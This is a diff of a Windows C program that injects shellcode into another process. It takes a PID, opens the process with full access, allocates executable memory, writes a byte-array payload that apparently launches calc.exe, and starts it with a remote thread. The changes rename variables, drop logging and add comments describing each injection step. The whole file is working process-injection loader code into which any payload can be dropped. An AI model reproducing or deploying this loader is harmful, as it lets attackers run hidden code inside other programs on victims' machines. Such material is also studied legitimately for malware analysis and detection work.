@@ -1,20 +1,15 @@
-
 #include <windows.h>
 #include <stdio.h>
 
-
-const char* k = "[+]";
-const char* e = "[-]";
-const char* i = "[*]";
-
 int main(int argc, char* argv[]) {
 
-    /* declare and initialize some vars for later use */
-    PVOID rBuffer = NULL;
-    DWORD dwPID, dwTID = NULL;
+    // Declare variables
+    PVOID buffer = NULL;
+    DWORD pid, tid = NULL;
     HANDLE hProcess, hThread = NULL;
 
-    unsigned char crowPuke[] =
+    // Shellcode to execute calc.exe
+    unsigned char code[] =
         "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
         "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
         "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
@@ -36,54 +31,43 @@ int main(int argc, char* argv[]) {
         "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
         "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
 
-    size_t crowPukeSize = sizeof(crowPuke);
+    size_t codeSize = sizeof(code);
 
+    // Get handle to the process in which we want to inject the shellcode
     if (argc < 2) {
-        printf("%s usage: %s <PID>", e, argv[0]);
         return EXIT_FAILURE;
     }
 
-    dwPID = atoi(argv[1]);
-
-    printf("%s trying to get a handle to the process (%ld)\n", i, dwPID);
-
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); 
+    pid = atoi(argv[1]);
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); 
 
     if (hProcess == NULL) {
-        printf("%s failed to get a handle to the process, error: 0x%lx", e, GetLastError());
         return EXIT_FAILURE;
     }
 
-    printf("%s got a handle to the process\n\\---0x%p\n", k, hProcess);
+    // Reserve memory in the address space of the process
+    buffer = VirtualAllocEx(hProcess, NULL, codeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 
-    rBuffer = VirtualAllocEx(hProcess, NULL, crowPukeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-    printf("%s allocated %zd-bytes to the process memory w/ PAGE_EXECUTE_READWRITE permissions\n", k, crowPukeSize);
-
-    if (rBuffer == NULL) {
-        printf("%s failed to allocate buffer, error: 0x%lx", e, GetLastError());
+    if (buffer == NULL) {
         return EXIT_FAILURE;
     }
 
-    WriteProcessMemory(hProcess, rBuffer, crowPuke, crowPukeSize, NULL);
-    printf("%s wrote %zd-bytes to allocated buffer\n", k, sizeof(crowPuke));
+    // Write into the memory space of the process
+    WriteProcessMemory(hProcess, buffer, code, codeSize, NULL);
 
-    /* create thread to run our payload */
-    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &dwTID);
+    // Create a thread in the target process to execute the shellcode
+    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, 0, &tid);
     
     if (hThread == NULL) {
-        printf("%s failed to get a handle to the new thread, error: %ld", e, GetLastError());
+        CloseHandle(hProcess);
         return EXIT_FAILURE;
     }
-    
-    printf("%s got a handle to the newly-created thread (%ld)\n\\---0x%p\n", k, dwTID, hProcess);
 
-    printf("%s waiting for thread to finish executing\n", i);
+    // Wait for the thread to finish its execution indefinitely
     WaitForSingleObject(hThread, INFINITE);
-    printf("%s thread finished executing, cleaning up\n", k);
 
     CloseHandle(hThread);
     CloseHandle(hProcess);
-    printf("%s finished, see you next time :>", k);
 
     return EXIT_SUCCESS;
 
